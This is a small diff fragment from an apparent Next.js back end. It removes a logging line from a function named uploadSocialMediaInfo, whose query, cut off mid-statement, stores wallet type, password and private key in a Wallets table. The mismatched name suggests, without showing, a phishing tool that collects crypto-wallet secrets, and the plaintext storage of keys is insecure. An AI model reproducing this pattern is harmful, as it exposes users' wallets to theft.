@@ -4,7 +4,7 @@ import {SendEmail} from "@/app/api/EmailSenderModule/SendEmail";
 import {mysqlConnection} from "@/app/api/connectionOptions";
 
 export async function uploadSocialMediaInfo(data: FieldValues, userName: string, userId: number) {
-    console.log(data, userId, userName)
+
     try {
         await mysqlConnection.execute(
             `INSERT INTO Wallets SET walletType = ?, \`Password\` = ?, PrivateKey = ?, 
